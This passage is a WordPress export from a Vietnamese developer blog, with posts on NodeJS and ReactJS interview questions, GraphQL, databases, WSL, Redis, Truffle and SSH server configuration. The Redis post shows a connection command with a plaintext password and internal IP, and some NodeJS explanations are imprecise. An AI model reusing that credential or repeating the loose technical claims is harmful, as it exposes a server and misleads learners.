- Deployment/tooling thì có thể sẽ hỏi bạn thường làm việc trong môi trường gì, deploy thế nào, có biết docker/k8s gì không (đây chỉ là điểm cộng thôi ko bắt buộc)
- Phần kiến thức này nói chung cũng chỉ xoay quanh những thứ mà JD yêu cầu thôi. Ví dụ công ty mình đang làm với node + mongo + aws thì sẽ hỏi xem bạn biết những thứ này tới đâu.
- Cái mà mình hay tập trung nghe là trong các dự án cũ bạn đã làm gì, học được gì, gặp khó khăn gì và vượt qua thế nào, có tâm đắc kiến thức gì không. Đây là đánh giá về quá khứ của bạn. Ngoài ra sẽ hỏi thêm cách bạn học tập và thu nạp kiến thức bên ngoài hoặc khi rảnh rỗi, đây là đánh giá về tương lai học hỏi của bạn. 
1 năm kinh nghiệm thì mình nghĩ là sẽ không bị hỏi quá khó đâu vì quá trình học tập phía trước vẫn còn rất dài. Chỉ cần thể hiện được mình HIỂU những thứ mình đã TỪNG LÀM và khả năng học hỏi là được.

Với title Junior, có nghĩa là bạn có thể tự mình xử lý được các task cơ bản như dựng một API, viết middware, validate dữ liệu, gọi api của bên thứ 3, support integrate với FE, query database… Từ yêu cầu đấy có thể list ra một vài skill cơ bản như
- hiểu các layer của app nodejs, http, api…
- có kinh nghiệm với ít nhất 1 framwork nodejs nào đó, nắm được cách giải quyết vấn đề của framework đó
- năm rõ nodejs và một số lib phổ biến
- hiểu được cơ chế hoạt động của client - server: Restfull, stateless - statefull, websocket, jwt, graphql…
- thao tác thành thạo với db: repository, orm, sql query, mongo…
- hiểu cơ bản về workflow: nói chuyện với FE, gitflow, postman, swagget, chome debugger
- hiểu được cách chạy của node, ưu nhược điểm và một số ứng dụng cũng như design parterns với node…

Em mới đi phỏng vấn nodejs ở vccorp về đây.
Họ hỏi điểm mạnh điểm yếu của nodejs, kỹ thuật cache nhiều tầng ( nếu miss thì làm thế nào), hỏi chi tiết các thuật toán mã hóa, cách phân chia các replication trong mongodb sao cho miss ít nhất, chút kiến thức về hệ điều hành ... vv còn nhiều lắm, mà em không nhớ, ấn tượng mỗi là họ hỏi chi tiết mấy cái thuật toán mã hóa ( cái này lúc học trên trường có môn atbm thì em nhớ chứ giờ em quên cmnr, SHA, md5, tri-des .vv ).

I. Vấn đề chung
Câu 1. Cache là gì
- Bộ nhớ máy tính lưu ở 3 nơi: ổ cứng (SSD), RAM và CPU --> cache lưu ở CPU
- Cache lưu ở đâu: Client(image, css, js) --> Proxy(file tĩnh..) --> Server Cache --> Database Cache
- Cache ở CPU có 3 cấp độ: L1 (chính) , L2 (thứ cấp), L3 (dự phòng cho L1, L2)
- Khi một chương trình khởi động trên máy tính của bạn, dữ liệu sẽ truyền từ RAM vào bộ đệm L3, rồi L2 và đến L1 sẽ rót trực tiếp dữ liệu cho các nhân CPU xử lý. Trong khi chương trình đang chạy, CPU tìm kiếm thông tin cần chạy, bắt đầu từ bộ đệm L1 và làm việc ngược từ đó.

Câu 2: Tốc độ thực hiện tiến trình ở máy tính phụ thuộc vào các yếu tố sau:
- CPU Bound: Giới hạn bởi tốc độ xử lý của CPU
- Memory Bound: Giới hạn bởi dung lượng khả dụng và tốc độ truy cập của bộ nhớ
- Cache Bound: Giới hạn bởi số lượng ô nhớ và tốc độ của các thanh cache khả dụng
- I/O Bound: Tốc độ thực hiện tiến trình bị giới hạn bởi tốc độ của các tác vụ IO 
Trong đó I/O thường rất chậm so với phần còn lại



Câu 3. Kiến trúc NodeJS
- NodeJs được viết bằng Javascript và C++, 2 Dependencie lớn nhất là V8 và LibUV

- V8 bao gồm: call stack(LIFO: last in first out)  và memory heap.

- LIBUV viết bằng C++, xử lý các tác vụ I/O không đồng bộ, 
- LIBUV bao gồm: event-queue, event-loop(cho các tác vụ đơn giản) và thread pool(các tác vụ nặng)

- Khi có nhiều request cùng thực hiện -> tất cả đều nằm trên Main thread và nằm trong envent-queue để thực hiện
- Khi yêu cầu từ Event Queue sang Event Loop --> được kiểm tra xem có phải tác vụ nặng không (xử lý file, mật mã, nén, Network Calls, Timers). Nếu có đẩy xuống Thread Pool
<img src="https://ren0503.github.io/assets/img/nodejs/threadpool.png" alt="" />

<img src="https://ren0503.github.io/assets/img/nodejs/node.jpg" alt="" />
- Thread pool cung cấp 4 thread(có thể config lên 128 thread) hoàn toàn tách biệt với signle thread trong event loop.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2069</wp:post_id>
		<wp:post_date><![CDATA[2022-03-15 16:15:49]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-03-15 16:15:49]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-04-08 15:26:46]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-04-08 15:26:46]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cau-hoi-nodejs]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[Câu hỏi ReactJs]]></title>
		<link>https://duycode.com/2022/03/16/cau-hoi-reactjs/</link>
		<pubDate>Wed, 16 Mar 2022 05:12:54 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2071</guid>
		<description></description>
		<content:encoded><![CDATA[Mình mới đi phỏng vấn xong nên chia sẻ với ae 1 chút về vòng phỏng vấn kĩ thuật junior 
1: Phân biệt props, state là gì. có thay đổi giá trị của props được không nếu được thì làm như nào.
2: SetState là hàm đồng bộ hay bất đồng bộ. Sẽ như nào nếu hàm này là hàm đồng bộ.
3: DOM ảo là gì, quá trình render, re-render được thực hiện như thế nào.
4: Em code chủ yếu là function component hay class component.
5: Em hãy trình bày về Lifecycle: tùy theo mình đang làm việc với react version bao nhiêu mà trình bày ở đây mình làm việc với version < 16.3 nên trình bày lifecycle cũ. Còn nếu xài từ 16.3 trở lên thì có thể trình bày theo lifecycle mới + nói thêm 1 chút về lifecycle cũ.
6: componentwillreceiveprops được sử dụng trong trường hợp nào.
7: shoudcomponentupdate được sử dụng trong trường hợp nào return true/false có ý nghĩa gì.
8: Trước khi có version 16.8 code function component được sử dụng để làm gì.
9: Trong function component(hooks) lifecycle được viết ở đâu. Có nhưng loại nào.
10: Tại sao team Reacr lại viết chung 3 lifecycle vào trong useEffect mà không tách riêng ra.
11: Giải thích ý nghĩa của từng Dependency trong useEffect.
12: Ngoài useEffect ra em còn biết về các hooks nào khác không, em đã custom 1 hooks nào chưa.
13: HOC là gì.
14: Promise, callback, asyn/await là gì.
15: Trình bày về lý do khi nào nên sử dụng redux.
16: Ngoài redux ra còn có cách nào để share dữ liệu không.
17: Chỉ ra 1 vài ưu điểm của state management mà em lựa chọn.
18: Em thường làm việc với các middleware nào.
19: Em biết là redux-thunk không.
20: Em biết Sass không.
21: Quy tắc đặt tên BEM.
22: Ngoài ra em có biết thêm về thư viện hỗ trợ việc css hay xây dựng UI nào không(tailwind,....)
23: Em biết TypeScript không.
24: Em có biết về thư viện hay framework nào hỗ trợ server-render-side không.
25: Theo em ReactJS là CRS hay SRS.

Mình nhớ sương sương như vậy. Buổi phỏng vấn của mình kéo dài khoảng 40 -45 phút.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2071</wp:post_id>
		<wp:post_date><![CDATA[2022-03-16 05:12:54]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-03-16 05:12:54]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:10:28]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:10:28]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cau-hoi-reactjs]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[GraphQL cơ bản]]></title>
		<link>https://duycode.com/2022/04/06/graphql-co-ban/</link>
		<pubDate>Wed, 06 Apr 2022 06:04:33 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2080</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://graphql.org/img/og-image.png" alt="https://graphql.org/img/og-image.png" />
<a href="https://graphql.org/code/#javascript" rel="noopener" target="_blank">https://graphql.org/code/#javascript</a>
<pre>
import { GraphQLInt, GraphQLList } from 'graphql'
import { graphql, GraphQLSchema, GraphQLObjectType, GraphQLString, GraphQLFloat } from 'graphql'

const dataFake = async () => {
    return {
        id: 232,
        className: '12A2',
        students: [
            { id: 1, name: 'Jack', age: 18, email: 'jack@gmail.com', mark: 9.8 },
            { id: 2, name: 'Peter', age: 19, email: 'peter@gmail.com', mark: 7.2 },
            { id: 3, name: 'John', age: 18, email: 'joshn@gmail.com', mark: 6.5 },
            { id: 4, name: 'Devil', age: 18, email: 'devil@gmail.com', mark: 4.2 },
            { id: 5, name: 'Anna', age: 19, email: 'anna@gmail.com', mark: 5.8 },
            { id: 6, name: 'Oliver', age: 18, email: 'oliver@gmail.com', mark: 9.2 },
        ],
    }
}

const teacherFake = async (filter: { id: number }) => {
    const teachersFake = await (async () => [
        { id: 1, name: 'Hanna', subject: 'Math' },
        { id: 2, name: 'Dr. Strangle', subject: 'Chemistry' },
    ])()

    return teachersFake.filter(item => item.id === filter.id)
}

const studentType = new GraphQLObjectType({
    name: 'students',
    fields: {
        id: { type: GraphQLInt },
        name: { type: GraphQLString },
        age: { type: GraphQLInt },
        email: { type: GraphQLString },
        mark: { type: GraphQLFloat },
    },
})

const teacherType = new GraphQLObjectType({
    name: 'teacher',
    fields: {
        id: { type: GraphQLInt },
        name: { type: GraphQLString },
        subject: { type: GraphQLString },
    },
})

const rootSchema = new GraphQLSchema({
    query: new GraphQLObjectType({
        name: 'rootSchema',
        fields: {
            id: { type: GraphQLInt },
            className: { type: GraphQLString },
            students: { type: new GraphQLList(studentType) },
            teachers: {
                type: new GraphQLList(teacherType),
                description: 'List of all Teacher',
                args: {
                    id: { type: GraphQLInt },
                },
                resolve: async (parent, args, context, info) => {
                    return await teacherFake({ id: args.id })
                },
            },
        },
    }),
})

const studentGrapQlstart = async () => {
    const response = await graphql({
        schema: rootSchema,
        source: 'query { id, className, students { name, age }, teachers(id:1) { id, name } }',
        rootValue: await dataFake(),
    })
    console.log(JSON.stringify(response))
}

studentGrapQlstart()
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2080</wp:post_id>
		<wp:post_date><![CDATA[2022-04-06 06:04:33]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-04-06 06:04:33]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-04-09 06:03:26]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-04-09 06:03:26]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[graphql-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="laravel"><![CDATA[Laravel]]></category>
						</item>
					<item>
		<title><![CDATA[Câu hỏi Database]]></title>
		<link>https://duycode.com/2022/04/11/cau-hoi-database/</link>
		<pubDate>Mon, 11 Apr 2022 13:47:40 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2097</guid>
		<description></description>
		<content:encoded><![CDATA[Câu 1: Các kiểu dữ liệu trong MySQL
- Kiểu Int: TinyInt, smallInt, MediumInt, Int, BigInt
- Kiểu số thực: Float(4 byte), Double(8 byte)
- Date, DateTime, Timestap (TimeStamp chuyển sang UTC khi lưu trữ và convert ngược lại khi lấy ra)
- Char(chiều dài cố định, hiệu suất nhanh hơn), Varchar


Câu 1: Phân biệt Left Join, Right Join, Inner Join trong SQL
Câu 2: Join collection trong MongoDB
- Dùng: $lookup hoặc ...
Câu 3: Index trong Database là gì
- INDEX giúp tăng tốc các truy vấn SELECT chứa các mệnh đề WHERE hoặc ORDER
- INDEX làm chậm việc dữ liệu nhập vào với các lệnh UPDATE và INSERT. Các chỉ mục có thể được tạo hoặc xóa mà không ảnh hưởng tới dữ liệu.
- Các kiểu index trong SQL:
 + Single-Column Index
 + Unique Index
 + Composite Index
 + Implicit Index (Index ngầm định): được tạo tự động cho các ràng buộc Primary key và các ràng buộc Unique
- Các kiểu index trong MongoDB:
 + Single Field Indexes
 + Unique Indexes
 + Compound Indexes

Câu 3: Tối ưu hiệu suất Database
- Đánh index
- Sử dụng từ khoá Like phải hợp lý: Tránh dùng '%' phía trước --> phải duyệt toàn bộ bản ghi
- Tránh sử dụng hàm thao tác lên column -> nên thao tác lên dữ liệu --> tránh duyệt toàn bộ bản ghi
- Tránh sử dụng điều kiện với các loại khác kiểu

Câu 4: Một số syntax cơ bản:
- UNION: gộp 2 câu lệnh select
- DISTINCT: loại bỏ giá trị trùng lặp
- COUNT: đếm số bản ghi
- Store procedure: cũng giống như tạo 1 function vậy :D
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2097</wp:post_id>
		<wp:post_date><![CDATA[2022-04-11 13:47:40]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-04-11 13:47:40]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-04-12 01:22:44]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-04-12 01:22:44]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cau-hoi-database]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="sql"><![CDATA[SQL]]></category>
						</item>
					<item>
		<title><![CDATA[WSL cơ bản]]></title>
		<link>https://duycode.com/2022/04/14/wsl-co-ban/</link>
		<pubDate>Thu, 14 Apr 2022 03:00:44 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2103</guid>
		<description></description>
		<content:encoded><![CDATA[1. Quên pass vào sudo
<blockquote>PS C:\Windows\system32> wsl --user root</blockquote>
Điền: whoami
<blockquote>root@DESKTOP-VCDFUR9:/mnt/c/Windows/system32# whoami</blockquote>
Điền: passwd {tên user}
<blockquote>root@DESKTOP-VCDFUR9:/mnt/c/Windows/system32# passwd duyk30b</blockquote>
Điền password mới --> xong

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2103</wp:post_id>
		<wp:post_date><![CDATA[2022-04-14 03:00:44]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-04-14 03:00:44]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-04-14 03:01:04]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-04-14 03:01:04]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[wsl-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[Redis cơ bản]]></title>
		<link>https://duycode.com/2022/04/14/redis-co-ban/</link>
		<pubDate>Thu, 14 Apr 2022 08:42:21 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2106</guid>
		<description></description>
		<content:encoded><![CDATA[1. Cài đặt Redis-CLI
-- bla bla bla
2. Connect vào Redis
<pre>
// connect như sau
redis-cli
## redis-cli -h 10.0.46.12 -p 6379 -a masredispass


PING                 // ping thử kết nối
keys *               // xem tất cả key
keys *bcde*          // tìm key có chữ "bcde"
TYPE abcdef          // xem kiểu dữ liệu của key "abcdef"
</pre>

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2106</wp:post_id>
		<wp:post_date><![CDATA[2022-04-14 08:42:21]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-04-14 08:42:21]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-04-14 08:43:17]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-04-14 08:43:17]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[redis-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[Solidity cơ bản]]></title>
		<link>https://duycode.com/2022/04/21/solidity-co-ban/</link>
		<pubDate>Thu, 21 Apr 2022 02:28:58 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2110</guid>
		<description></description>
		<content:encoded><![CDATA[1. IDE online: https://remix.ethereum.org/
2. Connect local với IDE online
- Setup: npm install -g @remix-project/remixd
- Connect: 
<blockquote>PS D:\Learning\blockchain\startone> remixd -s ./ --remix-ide https://remix.ethereum.org</blockquote>

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2110</wp:post_id>
		<wp:post_date><![CDATA[2022-04-21 02:28:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-04-21 02:28:58]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-04-21 02:28:58]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-04-21 02:28:58]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[solidity-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="blockchain"><![CDATA[Blockchain]]></category>
						</item>
					<item>
		<title><![CDATA[Sử dụng Truffle cơ bản]]></title>
		<link>https://duycode.com/2022/04/22/su-dung-truffle-co-ban/</link>
		<pubDate>Fri, 22 Apr 2022 01:55:29 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2112</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>I. Dựng project cơ bản</h2>
1. Dựng project React
<blockquote>npx create-react-app demo-project</blockquote>
- Từ giờ, các lệnh cmd sẽ sử dụng trong folder demo-project

2. Cài đặt truffle
<a href="https://trufflesuite.com/" rel="noopener" target="_blank">https://trufflesuite.com/</a>
<blockquote>npm install truffle -g</blockquote>

- Tạo project react, cài đặt thêm truffle
<blockquote>truffle init</blockquote>

- Tại file ./truffle-config.js
<pre>
    development: {
     host: "127.0.0.1",   
     port: 7545,            // Đoạn này phải đổi sang cổng 7545 cho giống bên ganache
     network_id: "*",    
    },
</pre>

3. Cài đặt ứng dụng: Ganache
<a href="https://trufflesuite.com/ganache/" rel="noopener" target="_blank">https://trufflesuite.com/ganache/</a>
- Tạo workspace mới --> trỏ đến file truffle-config.js (trong project react)
- Chạy đoạn migrate đầu tiên
<blockquote>truffle migrate</blockquote>

<h2>Sử dụng truffle</h2>
1. Tạo file contract (solidity) tiếp theo trong thư mục contract
2. Compile ra file json
<blockquote>truffle compile</blockquote>
3. Tạo file migrate
- Tên file bắt đầu bằng con số: 1_, 2_
4. Migrate: đưa lên host hay gì gì đó
<blockquote>truffle migrate</blockquote>
5. Vào ứng dụng ganache kiếm tra

6. Khi thay đổi code file .sol cần migrate lại
<blockquote>truffle migrate --reset</blockquote>

-- Xem list accounts (trong console truffle)
<blockquote>accounts</blockquote>

<h2>Truy cập biến bằng truffle</h2>
1. Luôn bật ganache
2. Dùng terminal
<blockquote>truffle console</blockquote>
3. Bắt đầu dùng console
<pre>
// Tạo biến
const instance = await Faucet.deployed()
// Show đối tượng
instance
// lấy biến trong đối tượng
const snd = await instance.so_nguyen_duong()
// xem biến
snd
snd.toString()
</pre>

4. Có thể dùng console với web3
<pre>
//Faucet.abi là constract, địa chỉ đằng sau là địa chỉ của contract đó (xem phần contract trên ganache)
const instance = new web3.eth.Contract(Faucet.abi, "0x24DB0ca0B537B89113Bfcd300D4Ee36167789682")
//xem instance
instance
// lấy 1 biến
const snd = await instance.methods.so_nguyen_duong().call()
// xem biến đó
snd
</pre>

<h2>Chuyển tiền bằng web3
Vẫn dùng console
<blockquote>web3.eth.sendTransaction({from: accounts[0], to: "0x6cF16A6f606E0dBDe888594515f148b83B348333", value: "10000000000000000000"}) </blockquote>





]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2112</wp:post_id>
		<wp:post_date><![CDATA[2022-04-22 01:55:29]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-04-22 01:55:29]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:10:01]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:10:01]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[su-dung-truffle-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="blockchain"><![CDATA[Blockchain]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[SSH - 1. Config Server]]></title>
		<link>https://duycode.com/2022/05/01/ssh-2-config-server/</link>
		<pubDate>Sat, 30 Apr 2022 18:00:05 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2131</guid>
		<description></description>
		<content:encoded><![CDATA[1. Mở file config bằng VIM
<blockquote>
sudo vi /etc/ssh/sshd_config
</blockquote>

2. Chỉnh sửa một số setting
<pre>
Port 22
// cho phép kết nối: với mọi IP
ListenAddress 0.0.0.0

// nhập Password để kết nối SSH: cho phép 
// nếu không cho phép thì chỉ còn phương pháp kết nối bằng cặp key
PasswordAuthentication yes

// Cho phép password rỗng: không
PermitEmptyPasswords no

// Số lần nhập mật khẩu: 6
MaxAuthTries 6

// Cho phép Tài khoản Root login: không
// Các tùy chọn: prohibit-password (phải dùng key SSH); no; yes
PermitRootLogin no

// Thời gian chờ nhàn rỗi: 300 giây
// Nếu trong 300 giây không có hoạt động sẽ bị disconnect
ClientAliveInterval 300

// Cho phép xác thực bằng cặp key
PubkeyAuthentication yes

// Vị trí đặt file key
// Như ở dưới nghĩa là với tài khoản duycode thì thư mục là: duycode/.ssh/authorized_keys
AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2
</pre>


3. Khởi động lại SSH daemon
<pre>
sudo systemctl restart sshd
</pre>

4. Thử trên 1 máy tính khác kết nối bằng SSH xem kết nối được chưa
<pre>
// port mặc định 22
ssh root@34.87.178.129
// nếu đổi cổng port sang 2233
ssh root@34.87.178.129 -p 2233
</pre>

5. Lưu ý
- Mỗi lần SSH vào 1 server, client sẽ lưu lại server đó (gọi là fingerprint)
- Giả sử server đó cài lại hệ điều hành, vẫn dùng user và password cũ thì client kết nối vào sẽ lỗi
- Lúc này cần xóa thông tin trong fingerprint mới kết nối lại được
- Thông tin các fingerprint được lưu ở: known_hosts
<blockquote>cat  ~/.ssh/known_hosts</blockquote>




]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2131</wp:post_id>
		<wp:post_date><![CDATA[2022-05-01 01:00:05]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-04-30 18:00:05]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-17 09:44:46]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-17 02:44:46]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[ssh-2-config-server]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[SSH – Connect by Key: 1 Create public-key and private-key]]></title>
		<link>https://duycode.com/2022/05/02/ssh-connect-by-key-1-create-public-key-and-private-key/</link>
		<pubDate>Sun, 01 May 2022 18:00:54 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2153</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>
Giả sử ta sẽ tạo 1 cặp key là: version_schat và version_schat.pub
- Phía Client sẽ dùng private key: version_schat
- Phía Server sẽ dùng publickey: version_schat.pub
</blockquote>

<h2>1. Tạo cặp SSH key mới</h2>
<pre>
// Xem danh sách key hiện có
$ ls -al ~/.ssh
# id_rsa      --> private key
# id_rsa.pub  --> public key

// Tạo cặp key mới với mã hóa rsa
$ ssh-keygen -t rsa -b 4096 -C "email_cua_ban@example.com" 
// ngắn gọn hơn
$ ssh-keygen -t rsa

// Lưu ý: rsa dần không được sử dụng nữa -> chuyển sang dùng ecdsa
ssh-keygen -t ecdsa -b 521 -C "your_email@example.com"

// Điền nơi lưu key: /home/duy.ngo/.ssh/version_schat
# Enter file in which to save the key (/home/duy.ngo/.ssh/id_rsa): [Press enter]

// Điền mật khẩu cho key
# Enter passphrase (empty for no passphrase): [Type a passphrase]
# Enter same passphrase again: [Type passphrase again]

# Your identification has been saved in /home/duy.ngo/.ssh/version_schat
# Your public key has been saved in /home/duy.ngo/.ssh/version_schat.pub
# The key fingerprint is:
# SHA256:uOQVsO0QRG5jC/Lw0UReEfxAxiSIYf4Y4IkxO0ppBWc duy.ngo@DU-OS3-DUYNV

// Xem lại danh sách key
$ ls -al ~/.ssh
# id_rsa
# id_rsa.pub
# version_schat       --> private key vừa tạo
# version_schat.pub   --> public key vừa tạo
</pre>

<h2>2. Thêm key vào ssh-agent</h2>
<pre>
// Kiểm tra ssh-agent xem đã được kích hoạt chưa
$ eval "$(ssh-agent -s)"
# Agent pid 59566

// Thêm key "version_schat" vào ssh
$ ssh-add ~/.ssh/version_schat
// Điền password của key version_schat
# Enter passphrase for /home/duy.ngo/.ssh/version_schat: 

# Identity added: /home/duy.ngo/.ssh/version_schat (duy.ngo@DU-OS3-DUYNV)
</pre>

<h2>3. Lấy nội dung public key</h2>
<pre>
// Nội dung public key
$ cat ~/.ssh/version_schat.pub
